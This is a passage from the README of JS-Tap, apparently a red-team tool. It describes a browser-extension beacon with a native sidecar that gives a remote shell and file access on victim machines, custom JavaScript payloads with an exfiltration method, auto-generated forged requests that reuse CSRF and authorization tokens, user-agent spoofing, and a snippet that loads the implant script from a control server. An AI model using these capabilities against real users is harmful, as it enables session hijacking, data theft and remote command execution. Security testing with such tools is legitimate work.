- **Navigator spoofing:** Open the browser console and type `navigator.userAgent` — it should return the victim's UA string, not Firefox's.

### Using the Sidecar Panel

When a BEX Beacon client has the Sidecar connected, the client detail view will show a **Sidecar** panel above the domain list. The panel has two tabs:

#### File Browser Tab
- The file browser automatically lists the user's home directory when the panel first loads
- Navigate by clicking folder names or the `..` entry to go up a directory
- The path input always reflects your current location and can be edited manually
- Click **Read** on a file to view its contents (base64-decoded and displayed as text)
- Click **Back to directory listing** to return from file view
- **Upload:** Select a file and click **Upload** to write it to the current browsed directory. The listing auto-refreshes after a successful upload. Maximum file size is 700 KB.

#### Shell Tab
- An interactive terminal with working directory (CWD) tracking across commands
- The prompt displays your current directory on the target system (e.g. `/home/user $ `)
- Type a command and press **Enter** or click **Run** to execute
- CWD persists between commands (`cd /tmp` followed by `ls` will list `/tmp`)
- **Command history:** Use **Up/Down** arrow keys to cycle through previous commands
- **Pop Out:** Click the **Pop Out** button to open the shell in a standalone window with its own title bar, full command history, and independent operation
- Output is color-coded: green for prompts, white for stdout, red for stderr
- CWD tracking uses POSIX shell syntax and works on Linux/macOS targets

**Note:** Sidecar commands are asynchronous. When you send a command, the UI polls for results. The beacon must check in (heartbeat) to pick up the command, forward it to the native binary, and send the result back. With default heartbeat settings, expect a few seconds delay.

### Custom Payloads
Starting in version 1.02 there is a custom payload feature. Multiple JavaScript payloads can be added in the JS-Tap portal and executed on a single client, all current clients, or set to autorun on all future clients. Payloads can be written/edited within the JS-Tap portal, or imported from a file. Payloads can also be exported. The format for importing payloads is simple JSON. The JavaScript code and description are simply base64 encoded.
```
[{"code":"YWxlcnQoJ1BheWxvYWQgMSBmaXJpbmcnKTs=","description":"VGhlIGZpcnN0IHBheWxvYWQ=","name":"Payload 1"},{"code":"YWxlcnQoJ1BheWxvYWQgMiBmaXJpbmcnKTs=","description":"VGhlIHNlY29uZCBwYXlsb2Fk","name":"Payload 2"}]
```
If your custom payload needs to exfiltrate data you can use the <i>customExfil(note, data)</i> method. Calling this method in your custom payload will send that text data back to JS-Tap and it will be displayed as an event in the loot data.<br>

The main user interface for custom payloads is from the top menu bar. Select **Custom Payloads** to open the interface. Any existing payloads will be shown in a list on the left. The button bar allows you to import and export the list. Payloads can be edited on the right side, although you can press the **Expand Code** button to get a larger code editing pane. To load an existing payload for editing select the payload by clicking on it in the **Saved Payloads** list. Once you have payloads defined and saved, you can execute them on clients. <br>

In the main **Custom Payloads** view you can launch a payload against all current clients (the **Run** button). You can also toggle on the **Autorun** attribute of a payload, which means that all new clients will run the payload. Note that existing clients will not run a payload based on the Autorun setting. <br>

You can toggle on **Repeat** and the payload will be tasked for each client when they check for tasks. Remember, the rate that a client checks for custom payload tasks is variable, and that rate can be changed in the main JS-Tap payload configuration. That rate can be changed with a custom payload (calling the <i>updateTaskCheckInterval(newDelay)</i> function). The jitter in the task check delay can be set with the <i>updateTaskCheckJitter(newTop, newBottom)</i> function. <br>

The **Clear All Jobs** button in the custom payload UI will delete all custom payload jobs from the queue for all clients and resets the auto/repeat run toggles. <br>

To run a payload on a single client user the **Run Payload** button on the specific client you wish to run it on, and then hit the **Run** button for the specific payload you wish to use. You can also set **Repeat** on individual clients.


### Autogenerated Custom Payloads (Mimic)
Starting in version 2.1 JS-Tap includes the ability to automatically generate custom payloads. This feature leverages the ability to intercept form submissions and XHR/Fetch API calls. JS-Tap can use those intercepted communications as a prototype to build a payload around. <br>

Parameters in the request will be set by variables at the top of the autogenerated payload, making for easy modification of the action being performed. Form submissions which need a CSRF token, and XHR/Fetch API calls that require an Authorization header will be handled by the mimic wizard; you can select these values in the intercepted form submission/api call and JS-Tap will search its database to determine where these values come from. <br>

A payload will be generated that first fetches the current value for these items in the user's browser, since these values will likely be different over time and across different users. The retrieved values will be used in the subsequent request that passes your modified parameters to the server to perform the action being "mimicked".<br>

If you skip searching for these values, the request doesn't have them, or JS-Tap cannot find the source, a payload will be generated that uses the CSRF tokens and Authorization header values from the original intercepted request. <br>

To use the mimic feature to create autogenerated payloads, find an intercepted form submission or API call and press the **Create Mimic Payload** button on the event card in the loot column. This will open the wizard where you select either a CSRF token (for form submissions) or Authorization headers for API calls. You'll need to copy the parameter/header name into the name field, and the token value into the value field. Once that is done, hit the **Search** button to let JS-Tap determine where these values are stored or retrieved from. <br>

If JS-Tap finds the source of those values, hitting next will generate the payload and enter it into the C2 system as a new payload. Change the payload name, description, and the parameter values at the top of the generated code to your desired settings and save it. You can then run that payload on JS-Tap clients.


## Project Structure

```
JS-Tap/
├── buildAll.py             # Unified build script (extensions + sidecar + deploy bundles)
├── jsTapServer.py          # Flask C2 server (all routes, models, logic)
├── jstapRun.sh             # Gunicorn production launcher
├── requirements.txt        # Python dependencies
├── telemlib.js             # JS-Tap implant payload (in payloads/)
├── index.html              # Dashboard HTML
├── login.html              # Login page
├── protectedStatic/
│   └── main.js             # All dashboard UI logic
├── bex-conductor/          # Session replay Firefox extension (standalone MV2)
│   ├── manifest.json       # Firefox MV2 manifest
│   ├── icon.svg            # Extension icon (JS-Tap logo)
│   ├── background/         # Cookie setting, header injection, UA spoofing
│   ├── content/            # Storage injection, navigator property spoofing
│   └── popup/              # Ticket import UI
├── bex-beacon/             # Browser extension (WXT + legacy)
│   ├── config.json         # Central configuration (extensions, IDs, sidecar)
│   ├── wxt.config.ts       # WXT build config
│   ├── package.json        # Node dependencies
│   ├── buildBexBeacon.py   # Legacy extension builder
│   ├── entrypoints/
│   │   ├── background/     # Service worker (heartbeat, tasks, encryption)
│   │   └── content/        # Content script (DOM instrumentation)
│   ├── utils/
│   │   ├── config.ts       # Config translation + whitelist helpers
│   │   ├── crypto.ts       # AES-GCM encryption/decryption helpers
│   │   └── sidecar.ts      # Native messaging module
│   ├── src-chrome-extension/   # Legacy Chrome MV3 template
│   └── src-firefox-extension/  # Legacy Firefox MV2 template
├── sidecar/                # Native messaging Go binary
│   ├── main.go             # Message loop (native messaging protocol)
│   ├── commands.go         # Command handlers (list_dir, read_file, exec_cmd)
│   ├── go.mod              # Go module
│   ├── config.json         # Auto-synced from central config by buildAll.py
│   ├── buildSidecar.py     # Cross-compile + generate install scripts
│   └── uninstall.sh        # Remove sidecar binary + manifests for testing
├── build/                  # Build output (gitignored)
│   ├── chrome-mv3/         # Unpacked Chrome extension
│   ├── firefox-mv2/        # Unpacked Firefox extension
│   ├── extension.crx       # Packed Chrome extension
│   ├── extension.xpi       # Packed Firefox extension
│   ├── sidecar/            # Sidecar binaries + manifests
│   └── deploy/             # Self-contained deploy bundles (.tar.gz/.zip)
└── tools/                  # Testing utilities
    ├── clientSimulator.py
    ├── monkeyPatchLab.py
    └── defconServer.py
```


## Tools
A few tools are included in the tools subdirectory.

### clientSimulator.py
A script to stress test the jsTapServer. Good for determining roughly how many clients your server can handle. Note that running the clientSimulator script is probably more resource intensive than the actual jsTapServer, so you may wish to run it on a separate machine.

At the top of the script is a **numClients** variable, set to how many clients you want to simulator. The script will spawn a thread for each, retrieve a client session, and send data in simulating a client.

```
numClients = 50
```

You'll also need to configure where you're running the jsTapServer for the clientSimulator to connect to:
```
apiServer = "https://127.0.0.1:8444"
```

JS-Tap run using gunicorn scales quite well.

### MonkeyPatchApp
A simple app used for testing XHR/Fetch monkeypatching, but can give you a simple app to test the payload against in general.

Run with:
```
python3 monkeyPatchLab.py
```

By default this will start the application running on:
```
https://127.0.0.1:8443
```

Pressing the "Inject JS-Tap payload" button will run the JS-Tap payload. This works for either implant or trap mode. You may need to point the monkeyPatchLab application at a new JS-Tap server location for loading the payload file, you can find this set in the **injectPayload()** function in **main.js**

```
function injectPayload()
{
	document.head.appendChild(Object.assign(document.createElement('script'),
		{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));
}
```

### DefconApp
Another simple app similiar to the MonkeyPathApp, however the XHR API calls in this application makes a visible change in the application (changing the "defcon" level).<br>

It also has a **Inject Js-Tap payload** button that simulates and XSS exploit. All of the code is included in the **defconServer.py** file, including the JavaScript and HTML.<br>

This application is a good test for autogenerating payloads from intercepted XHR network calls.

### formParser.py
Abandoned tool, is a good start on analyzing HTML for forms and parsing out their parameters. Intended to help automatically generate JavaScript payloads to target form posts.

You should be able to run it on exfiltrated HTML files. Again, this is currently abandonware and has been superceded by the mimic feature that autogenerates custom payloads.


### generateIntelReport.py
No longer working, used before the web UI for JS-Tap. The generateIntelReport script would comb through the gathered loot and generate a PDF report. Saving all the loot to disk is now disabled for performance reasons, most of it is stored in the datagbase with the exception of exfiltratred HTML code and screenshots.




## Contact
@hoodoer<br>
hoodoer@bitwisemunitions.dev
